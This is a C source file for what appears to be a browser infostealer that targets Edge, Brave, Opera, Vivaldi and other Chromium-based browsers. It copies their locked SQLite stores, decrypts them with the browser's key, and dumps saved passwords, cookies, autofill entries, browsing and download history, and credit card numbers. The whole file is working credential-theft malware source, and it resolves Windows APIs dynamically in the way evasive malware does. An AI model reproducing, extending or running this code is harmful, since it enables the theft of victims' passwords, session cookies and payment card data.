#include "../../include/chromium.h"
#include "../../include/crypto.h"
#include "../../include/thirdparty/cJSON.h"
#include "../../include/thirdparty/sqlite3.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <stdbool.h>
#include <time.h>
#include "../../dependencies/libsodium-win64/include/sodium.h"
#define PREFIX_LEN 3
#define IV_SIZE 12
#define TAG_SIZE 16

int HarvestPasswords(const char *loginDataPath, HMODULE hKernel32, DATA_BLOB decryptionKey)
{

    /*
    Here we are copying the "login Data" SQLITE file. Reason is that if we won't be able to interact with the database while
    the browser is running since the "Login Data" file will be locked cause it's being used by the browser process. So instead
    we copy it so that we can then read from it without having to worry about it being locked.
    */

    if (hKernel32 == NULL)
    {
        printf("[-] Failed to load kernel32.");
        printf("Error: %u\n", GetLastError());
    }
    typedef BOOL(WINAPI * FILECOPY)(LPCTSTR, LPCTSTR, BOOL);

    FILECOPY pCopyFile = (FILECOPY)GetProcAddress(hKernel32, "CopyFileA");

    if (!pCopyFile)
    {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());
        return 0;
    }

    char loginCopyPath[MAX_PATH] = {0};

    snprintf(loginCopyPath, sizeof(loginCopyPath), "%s-%s", loginDataPath, "Copy");

    if (!pCopyFile(loginDataPath, loginCopyPath, FALSE))
    {
        // printf("Error copying the file. Error: %ld", GetLastError());
        return 0;
    }

    // puts("[+] 'Login Data' File copied. :)");

    /*
    Here we open the Login Data-Copy sqlite db file.
    */
    sqlite3 *loginCopyDB;
    const char *sql = "SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins;";
    int db_conn;

    db_conn = sqlite3_open_v2(loginCopyPath, &loginCopyDB, SQLITE_OPEN_READONLY, NULL);

    if (db_conn)
    {
        // fprintf(stderr, "[-] Can't open database: %s\n", sqlite3_errmsg(loginCopyDB));
        return 0;
    }
    else
    {
        // fprintf(stderr, "[+] Opened database successfully\n");
    }

    sqlite3_stmt *statement = NULL;

    int sqlStatus = sqlite3_prepare_v2(loginCopyDB, sql, -1, &statement, NULL);

    while ((sqlStatus = sqlite3_step(statement)) == SQLITE_ROW)
    {
        const unsigned char *originUrl = sqlite3_column_text(statement, 0);
        const unsigned char *usernameValue = sqlite3_column_text(statement, 1);
        const void *passwordBlob = sqlite3_column_blob(statement, 2);
        int passwordSize = sqlite3_column_bytes(statement, 2);
        int blacklistedByUser = sqlite3_column_int(statement, 3);
        if (originUrl != NULL && originUrl[0] != '\0' && usernameValue != NULL && usernameValue[0] != '\0' && passwordBlob != NULL && blacklistedByUser != 1)
        {
            unsigned char iv[IV_SIZE];
            if (passwordSize >= (IV_SIZE + 3))
            {
                memcpy(iv, (unsigned char *)passwordBlob + 3, IV_SIZE);
            }
            else
            {
                continue;
            }
            if (passwordSize <= (IV_SIZE + 3))
            {
                continue;
            }
            BYTE *Password = (BYTE *)malloc(passwordSize - (IV_SIZE + 3));
            if (Password == NULL)
            {
                continue;
            }
            memcpy(Password, (unsigned char *)passwordBlob + (IV_SIZE + 3), passwordSize - (IV_SIZE + 3));
            unsigned char decrypted[1024];
            DecryptBlob(Password, passwordSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decrypted);
            decrypted[passwordSize - (IV_SIZE + 3)] = '\0';

            printf("Origin URL: %s\n", originUrl);
            printf("Username Value: %s\n", usernameValue);
            printf("Password: %s\n", decrypted);

            free(Password);
        }
    }
    sqlite3_finalize(statement);
    sqlite3_close_v2(loginCopyDB);
}

int HarvestCookies(const char *cookieDataPath, HMODULE hKernel32, DATA_BLOB decryptionKey)
{

    /*
    Here we are copying the "login Data" SQLITE file. Reason is that if we won't be able to interact with the database while
    the browser is running since the "Login Data" file will be locked cause it's being used by the browser process. So instead
    we copy it so that we can then read from it without having to worry about it being locked.
    */

    if (hKernel32 == NULL)
    {
        printf("[-] Failed to load kernel32.");
        printf("Error: %u\n", GetLastError());
    }
    typedef BOOL(WINAPI * FILECOPY)(LPCTSTR, LPCTSTR, BOOL);

    FILECOPY pCopyFile = (FILECOPY)GetProcAddress(hKernel32, "CopyFileA");

    if (!pCopyFile)
    {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());
        return 0;
    }

    char cookieCopyPath[MAX_PATH] = {0};

    snprintf(cookieCopyPath, sizeof(cookieCopyPath), "%s-%s", cookieDataPath, "Copy");

    if (!pCopyFile(cookieDataPath, cookieCopyPath, FALSE))
    {
        // printf("Error copying the file. Error: %ld", GetLastError());
        return 0;
    }

    // puts("[+] 'cookie Data' File copied. :)");

    /*
    Here we open the cookie Data-Copy sqlite db file.
    */
    sqlite3 *cookieCopyDB;
    const char *sql = "SELECT host_key, name, encrypted_value FROM cookies;";
    int db_conn;

    db_conn = sqlite3_open_v2(cookieCopyPath, &cookieCopyDB, SQLITE_OPEN_READONLY, NULL);

    if (db_conn)
    {
        // fprintf(stderr, "[-] Can't open database: %s\n", sqlite3_errmsg(cookieCopyDB));
        return 0;
    }
    else
    {
        // fprintf(stderr, "[+] Opened database successfully\n");
    }

    sqlite3_stmt *statement = NULL;

    int sqlStatus = sqlite3_prepare_v2(cookieCopyDB, sql, -1, &statement, NULL);

    while ((sqlStatus = sqlite3_step(statement)) == SQLITE_ROW)
    {
        const unsigned char *host_key = sqlite3_column_text(statement, 0);
        const unsigned char *name = sqlite3_column_text(statement, 1);
        const void *CookieBlob = sqlite3_column_blob(statement, 2);
        int CookieSize = sqlite3_column_bytes(statement, 2);
        int blacklistedByUser = sqlite3_column_int(statement, 3);
        if (host_key != NULL && host_key[0] != '\0' && name != NULL && name[0] != '\0' && CookieBlob != NULL && blacklistedByUser != 1)
        {
            unsigned char iv[IV_SIZE];
            if (CookieSize >= (IV_SIZE + 3))
            {
                memcpy(iv, (unsigned char *)CookieBlob + 3, IV_SIZE);
            }
            else
            {
                continue;
            }
            if (CookieSize <= (IV_SIZE + 3))
            {
                continue;
            }
            BYTE *Cookie = (BYTE *)malloc(CookieSize - (IV_SIZE + 3));
            if (Cookie == NULL)
            {
                continue;
            }
            memcpy(Cookie, (unsigned char *)CookieBlob + (IV_SIZE + 3), CookieSize - (IV_SIZE + 3));
            unsigned char decrypted[1024];
            DecryptBlob(Cookie, CookieSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decrypted);
            decrypted[CookieSize - (IV_SIZE + 3)] = '\0';

            printf("Host: %s\n", host_key);
            printf("Cookie Name: %s\n", name);
            printf("Cookie: %s\n", decrypted);

            free(Cookie);
        }
    }
    sqlite3_finalize(statement);
    sqlite3_close_v2(cookieCopyDB);
}

int HarvestAutoComplete(const char *autoCompletePath, HMODULE hKernel32, DATA_BLOB decryptionKey)
{

    /*
    Here we are copying the "login Data" SQLITE file. Reason is that if we won't be able to interact with the database while
    the browser is running since the "Login Data" file will be locked cause it's being used by the browser process. So instead
    we copy it so that we can then read from it without having to worry about it being locked.
    */

    if (hKernel32 == NULL)
    {
        printf("[-] Failed to load kernel32.");
        printf("Error: %u\n", GetLastError());
    }
    typedef BOOL(WINAPI * FILECOPY)(LPCTSTR, LPCTSTR, BOOL);

    FILECOPY pCopyFile = (FILECOPY)GetProcAddress(hKernel32, "CopyFileA");

    if (!pCopyFile)
    {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());
        return 0;
    }

    char autoCompleteCopy[MAX_PATH] = {0};

    snprintf(autoCompleteCopy, sizeof(autoCompleteCopy), "%s-%s", autoCompletePath, "Copy");

    if (!pCopyFile(autoCompletePath, autoCompleteCopy, FALSE))
    {
        // printf("Error copying the file. Error: %ld", GetLastError());
        return 0;
    }

    // puts("[+] 'Login Data' File copied. :)");

    /*
    Here we open the Login Data-Copy sqlite db file.
    */
    sqlite3 *autocompleteCopyDB;
    const char *sql = "SELECT name, value, date_created FROM autofill;";
    int db_conn;

    db_conn = sqlite3_open_v2(autoCompleteCopy, &autocompleteCopyDB, SQLITE_OPEN_READONLY, NULL);

    if (db_conn)
    {
        // fprintf(stderr, "[-] Can't open database: %s\n", sqlite3_errmsg(loginCopyDB));
        return 0;
    }
    else
    {
        // fprintf(stderr, "[+] Opened database successfully\n");
    }

    sqlite3_stmt *statement = NULL;

    int sqlStatus = sqlite3_prepare_v2(autocompleteCopyDB, sql, -1, &statement, NULL);

    while ((sqlStatus = sqlite3_step(statement)) == SQLITE_ROW)
    {
        const void *autoValue = sqlite3_column_blob(statement, 1);
        int autoSize = sqlite3_column_bytes(statement, 1);
        if (autoValue != NULL)
        {
            unsigned char iv[IV_SIZE];
            if (autoSize >= (IV_SIZE + 3))
            {
                memcpy(iv, (unsigned char *)autoValue + 3, IV_SIZE);
            }
            else
            {
                continue;
            }
            if (autoSize <= (IV_SIZE + 3))
            {
                continue;
            }
            BYTE *Auto = (BYTE *)malloc(autoSize - (IV_SIZE + 3));
            if (Auto == NULL)
            {
                continue;
            }
            if (memcmp(autoValue, "v10", 3) != 0)
            {
                printf("Auto[Plaintext]: %s\n", (char *)autoValue);
                continue;
            }
            memcpy(Auto, (unsigned char *)autoValue + (IV_SIZE + 3), autoSize - (IV_SIZE + 3));
            unsigned char decryptedAuto[1024];
            DecryptBlob(Auto, autoSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decryptedAuto);
            decryptedAuto[autoSize - (IV_SIZE + 3)] = '\0';

            printf("Auto: %s\n", decryptedAuto);
            free(Auto);
        }
    }
    sqlite3_close_v2(autocompleteCopyDB);
    sqlite3_finalize(statement);
}

int HarvestHistory(const char *historyPath, HMODULE hKernel32, DATA_BLOB decryptionKey)
{

    /*
    Here we are copying the "login Data" SQLITE file. Reason is that if we won't be able to interact with the database while
    the browser is running since the "Login Data" file will be locked cause it's being used by the browser process. So instead
    we copy it so that we can then read from it without having to worry about it being locked.
    */

    if (hKernel32 == NULL)
    {
        printf("[-] Failed to load kernel32.");
        printf("Error: %u\n", GetLastError());
    }
    typedef BOOL(WINAPI * FILECOPY)(LPCTSTR, LPCTSTR, BOOL);

    FILECOPY pCopyFile = (FILECOPY)GetProcAddress(hKernel32, "CopyFileA");

    if (!pCopyFile)
    {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());
        return 0;
    }

    char historyCopy[MAX_PATH] = {0};

    snprintf(historyCopy, sizeof(historyCopy), "%s-%s", historyPath, "Copy");

    if (!pCopyFile(historyPath, historyCopy, FALSE))
    {
        // printf("Error copying the file. Error: %ld", GetLastError());
        return 0;
    }

    // puts("[+] 'Login Data' File copied. :)");

    /*
    Here we open the Login Data-Copy sqlite db file.
    */
    sqlite3 *historyCopyDB;
    const char *sql = "SELECT url, title, visit_count, last_visit_time FROM urls;";
    int db_conn;

    db_conn = sqlite3_open_v2(historyCopy, &historyCopyDB, SQLITE_OPEN_READONLY, NULL);

    if (db_conn)
    {
        // fprintf(stderr, "[-] Can't open database: %s\n", sqlite3_errmsg(loginCopyDB));
        return 0;
    }
    else
    {
        // fprintf(stderr, "[+] Opened database successfully\n");
    }

    sqlite3_stmt *statement = NULL;

    int sqlStatus = sqlite3_prepare_v2(historyCopyDB, sql, -1, &statement, NULL);
    char date_buffer[80];
    while ((sqlStatus = sqlite3_step(statement)) == SQLITE_ROW)
    {
        const unsigned char *url = sqlite3_column_text(statement, 0);
        const unsigned char *title = sqlite3_column_text(statement, 1);
        const unsigned char *visit_count = sqlite3_column_text(statement, 2);
        const unsigned char *last_visit = sqlite3_column_text(statement, 3);

        time_t epoch_last_visit = (time_t)atol(last_visit);
        struct tm *local_tm = localtime(&epoch_last_visit); // For local time
        strftime(date_buffer, sizeof(date_buffer), "%d-%m-%Y %H:%M:%S", local_tm);

        printf("URL: %s\n", url);
        printf("Title: %s\n", title);
        printf("Visit Count: %s\n", visit_count);
        printf("Last Visit: %s\n", date_buffer);
    }
    sqlite3_finalize(statement);
    sqlite3_close_v2(historyCopyDB);
}

int HarvestCreditCards(const char *webDataPath, HMODULE hKernel32, DATA_BLOB decryptionKey)
{

    /*
    Here we are copying the "login Data" SQLITE file. Reason is that if we won't be able to interact with the database while
    the browser is running since the "Login Data" file will be locked cause it's being used by the browser process. So instead
    we copy it so that we can then read from it without having to worry about it being locked.
    */

    if (hKernel32 == NULL)
    {
        printf("[-] Failed to load kernel32.");
        printf("Error: %u\n", GetLastError());
    }
    typedef BOOL(WINAPI * FILECOPY)(LPCTSTR, LPCTSTR, BOOL);

    FILECOPY pCopyFile = (FILECOPY)GetProcAddress(hKernel32, "CopyFileA");

    if (!pCopyFile)
    {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());
        return 0;
    }

    char creditcardCopyPath[MAX_PATH] = {0};

    snprintf(creditcardCopyPath, sizeof(creditcardCopyPath), "%s-%s", webDataPath, "Copy");

    if (!pCopyFile(webDataPath, creditcardCopyPath, FALSE))
    {
        // printf("Error copying the file. Error: %ld", GetLastError());
        return 0;
    }

    // puts("[+] 'Login Data' File copied. :)");

    /*
    Here we open the Login Data-Copy sqlite db file.
    */
    sqlite3 *creditcardCopyDB;
    const char *sql = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;";
    int db_conn;

    db_conn = sqlite3_open_v2(creditcardCopyPath, &creditcardCopyDB, SQLITE_OPEN_READONLY, NULL);

    if (db_conn)
    {
        // fprintf(stderr, "[-] Can't open database: %s\n", sqlite3_errmsg(creditcardCopyDB));
        return 0;
    }
    else
    {
        // fprintf(stderr, "[+] Opened database successfully\n");
    }

    sqlite3_stmt *statement = NULL;

    int sqlStatus = sqlite3_prepare_v2(creditcardCopyDB, sql, -1, &statement, NULL);

    while ((sqlStatus = sqlite3_step(statement)) == SQLITE_ROW)
    {
        const unsigned char *name_on_card = sqlite3_column_text(statement, 0);
        const unsigned char *expiration_month = sqlite3_column_text(statement, 1);
        const unsigned char *expiration_year = sqlite3_column_text(statement, 2);
        const void *creditcardBlob = sqlite3_column_blob(statement, 3);
        int creditcardSize = sqlite3_column_bytes(statement, 3);
        if (name_on_card != NULL && name_on_card[0] != '\0' && expiration_month != NULL && expiration_month[0] != '\0' && expiration_year != NULL && expiration_year[0] && creditcardBlob != NULL)
        {
            unsigned char iv[IV_SIZE];
            if (creditcardSize >= (IV_SIZE + 3))
            {
                memcpy(iv, (unsigned char *)creditcardBlob + 3, IV_SIZE);
            }
            else
            {
                continue;
            }
            if (creditcardSize <= (IV_SIZE + 3))
            {
                continue;
            }
            BYTE *CreditCard = (BYTE *)malloc(creditcardSize - (IV_SIZE + 3));
            if (CreditCard == NULL)
            {
                continue;
            }
            memcpy(CreditCard, (unsigned char *)creditcardBlob + (IV_SIZE + 3), creditcardSize - (IV_SIZE + 3));
            unsigned char decrypted[1024];
            DecryptBlob(CreditCard, creditcardSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decrypted);
            decrypted[creditcardSize - (IV_SIZE + 3)] = '\0';

            printf("Name: %s\n", name_on_card);
            printf("Expiration Month: %s\n", expiration_month);
            printf("Expiration Year: %s\n", expiration_year);
            printf("Credit Card: %s\n", decrypted);

            free(CreditCard);
        }
    }
    sqlite3_finalize(statement);
    sqlite3_close_v2(creditcardCopyDB);
}

int HarvestDownloadHistory(const char *historyPath, HMODULE hKernel32, DATA_BLOB decryptionKey)
{

    /*
    Here we are copying the "login Data" SQLITE file. Reason is that if we won't be able to interact with the database while
    the browser is running since the "Login Data" file will be locked cause it's being used by the browser process. So instead
    we copy it so that we can then read from it without having to worry about it being locked.
    */

    if (hKernel32 == NULL)
    {
        printf("[-] Failed to load kernel32.");
        printf("Error: %u\n", GetLastError());
    }
    typedef BOOL(WINAPI * FILECOPY)(LPCTSTR, LPCTSTR, BOOL);

    FILECOPY pCopyFile = (FILECOPY)GetProcAddress(hKernel32, "CopyFileA");

    if (!pCopyFile)
    {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());
        return 0;
    }

    char historyCopy[MAX_PATH] = {0};

    snprintf(historyCopy, sizeof(historyCopy), "%s-%s", historyPath, "Copy");

    if (!pCopyFile(historyPath, historyCopy, FALSE))
    {
        // printf("Error copying the file. Error: %ld", GetLastError());
        return 0;
    }

    // puts("[+] 'Login Data' File copied. :)");

    /*
    Here we open the Login Data-Copy sqlite db file.
    */
    sqlite3 *historyCopyDB;
    const char *sql = "SELECT  target_path, tab_url, state FROM downloads;";
    int db_conn;

    db_conn = sqlite3_open_v2(historyCopy, &historyCopyDB, SQLITE_OPEN_READONLY, NULL);

    if (db_conn)
    {
        // fprintf(stderr, "[-] Can't open database: %s\n", sqlite3_errmsg(loginCopyDB));
        return 0;
    }
    else
    {
        // fprintf(stderr, "[+] Opened database successfully\n");
    }

    sqlite3_stmt *statement = NULL;

    int sqlStatus = sqlite3_prepare_v2(historyCopyDB, sql, -1, &statement, NULL);

    while ((sqlStatus = sqlite3_step(statement)) == SQLITE_ROW)
    {
        const unsigned char *target_path = sqlite3_column_text(statement, 0);
        const unsigned char *tab_url = sqlite3_column_text(statement, 1);
        printf("File Path: %s\n", target_path);
        printf("URL: %s\n", tab_url);
    }
    sqlite3_finalize(statement);
    sqlite3_close_v2(historyCopyDB);
}

void BrowserInfo()
{
    printf("[+] Running Password\n");
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    HMODULE hShlwapi = LoadLibraryA("shlwapi.dll");

    if (hKernel32 == NULL)
    {
        printf("[-] Failed to load kernel32.\n");
        printf("Error: %u\n", GetLastError());
    }

    if (hShlwapi == NULL)
    {
        printf("[-] Failed to load shlwapi.\n");
        printf("Error: %u\n", GetLastError());
    }

    if (sodium_init() < 0)
    {
        printf("[-] Failed to initialize libsodium\n");
    }

    typedef DWORD(WINAPI * ENVIRON)(LPCSTR, LPSTR, DWORD);
    ENVIRON pGetEnvironmentVariable = (ENVIRON)GetProcAddress(hKernel32, "GetEnvironmentVariableA");

    typedef BOOL(WINAPI * PATHFILEEXISTS)(LPCSTR);
    PATHFILEEXISTS pPathFileExistsA = (PATHFILEEXISTS)GetProcAddress(hShlwapi, "PathFileExistsA");

    char localAppdata[MAX_PATH] = {0};
    ULONG localAppdataSize = sizeof(localAppdata);
    char Appdata[MAX_PATH] = {0};
    ULONG AppdataSize = sizeof(Appdata);

    char browserPath[MAX_PATH] = {0};

    char loginDataPath[MAX_PATH] = {0};
    char cookieDataPath[MAX_PATH] = {0};
    char webDataPath[MAX_PATH] = {0};
    char historyPath[MAX_PATH] = {0};

    char localstatePath[MAX_PATH] = {0};

    pGetEnvironmentVariable("LOCALAPPDATA", localAppdata, localAppdataSize);
    pGetEnvironmentVariable("APPDATA", Appdata, AppdataSize);
    char *localPaths[] = {"\\Microsoft\\Edge\\User Data", "\\BraveSoftware\\Brave-Browser\\User Data", "\\Vivaldi\\User Data", "\\Yandex\\YandexBrowser\\User Data", "\\Comodo\\Dragon\\User Data", "\\Epic Privacy Browser\\User Data", "\\Iridium\\User Data", "\\CentBrowser\\User Data", "\\Chromium\\User Data\\", "\\Torch\\User Data", "\\CocCoc\\Browser\\User Data", "\\360Browser\\Browser\\User Data","\\Respondus\\Cache\\"};
    char *roamingPaths[] = {"\\Opera Software\\Opera GX Stable", "\\Opera Software\\Opera Stable"};
    size_t localCount = sizeof(localPaths) / sizeof(localPaths[0]);
    size_t roamingCount = sizeof(roamingPaths) / sizeof(roamingPaths[0]);
    printf("\n======= [START] =======\n");
    for (int i = 0; i < localCount; i++)
    {
        snprintf(browserPath, sizeof(browserPath), "%s%s", localAppdata, localPaths[i]);
        snprintf(loginDataPath, sizeof(loginDataPath), "%s%s", browserPath, "\\Default\\Login Data");
        snprintf(cookieDataPath, sizeof(cookieDataPath), "%s%s", browserPath, "\\Default\\Network\\Cookies");
        snprintf(webDataPath, sizeof(webDataPath), "%s%s", browserPath, "\\Default\\Web Data");
        snprintf(historyPath, sizeof(historyPath), "%s%s", browserPath, "\\Default\\History");
        snprintf(localstatePath, sizeof(localstatePath), "%s%s", browserPath, "\\Local State");
        DATA_BLOB decryptedKey = DecryptBrowserKey(localstatePath);
        printf("[+] BROWSER PATH: %s: [%s]\n", browserPath, pPathFileExistsA(browserPath) ? "true" : "false");
        printf("[+] LOGIN DATA: %s: [%s]\n", loginDataPath, pPathFileExistsA(loginDataPath) ? "true" : "false");
        printf("[+] COOKIES PATH: %s: [%s]\n", cookieDataPath, pPathFileExistsA(cookieDataPath) ? "true" : "false");
        printf("[+] LOCALAPPDATA: %s: [%s]\n", localAppdata, pPathFileExistsA(localAppdata) ? "true" : "false");
        printf("[+] LOCAL STATE: %s: [%s]\n", localstatePath, pPathFileExistsA(localstatePath) ? "true" : "false");
        printf("\n======= [%s] =======\n", browserPath);
        printf("PASSWORDS: \n");
        HarvestPasswords(loginDataPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
        // printf("COOKIES: \n");
        // HarvestCookies(cookieDataPath, hKernel32, decryptedKey);
        // printf("\n");
        // printf("\n");
        printf("AUTOCOMPLETE: \n");
        HarvestAutoComplete(webDataPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
        printf("HISTORY: \n");
        HarvestHistory(historyPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
        printf("DOWNLOAD HISTORY: \n");
        HarvestDownloadHistory(historyPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");

        printf("CREDIT CARD: \n");
        HarvestCreditCards(webDataPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
    }
    for (int i = 0; i < roamingCount; i++)
    {
        snprintf(browserPath, sizeof(browserPath), "%s%s", Appdata, roamingPaths[i]);
        snprintf(loginDataPath, sizeof(loginDataPath), "%s%s", browserPath, "\\Default\\Login Data");
        snprintf(cookieDataPath, sizeof(cookieDataPath), "%s%s", browserPath, "\\Default\\Network\\Cookies");
        snprintf(webDataPath, sizeof(webDataPath), "%s%s", browserPath, "\\Default\\Web Data");
        snprintf(historyPath, sizeof(historyPath), "%s%s", browserPath, "\\Default\\History");
        snprintf(localstatePath, sizeof(localstatePath), "%s%s", browserPath, "\\Local State");
        DATA_BLOB decryptedKey = DecryptBrowserKey(localstatePath);
        printf("[+] BROWSER PATH: %s: [%s]\n", browserPath, pPathFileExistsA(browserPath) ? "true" : "false");
        printf("[+] LOGIN DATA: %s: [%s]\n", loginDataPath, pPathFileExistsA(loginDataPath) ? "true" : "false");
        printf("[+] COOKIES PATH: %s: [%s]\n", cookieDataPath, pPathFileExistsA(cookieDataPath) ? "true" : "false");
        printf("[+] LOCALAPPDATA: %s: [%s]\n", localAppdata, pPathFileExistsA(localAppdata) ? "true" : "false");
        printf("[+] LOCAL STATE: %s: [%s]\n", localstatePath, pPathFileExistsA(localstatePath) ? "true" : "false");
        printf("\n======= [%s] =======\n", browserPath);
        printf("PASSWORDS: \n");
        HarvestPasswords(loginDataPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
        // printf("COOKIES: \n");
        // HarvestCookies(cookieDataPath, hKernel32, decryptedKey);
        // printf("\n");
        // printf("\n");
        printf("AUTOCOMPLETE: \n");
        HarvestAutoComplete(webDataPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
        printf("HISTORY: \n");
        HarvestHistory(historyPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
        printf("CREDIT CARD: \n");
        HarvestCreditCards(webDataPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
        printf("DOWNLOAD HISTORY: \n");
        HarvestDownloadHistory(historyPath, hKernel32, decryptedKey);
        printf("\n");
        printf("\n");
    }
    printf("\n======= [END] =======\n");
}
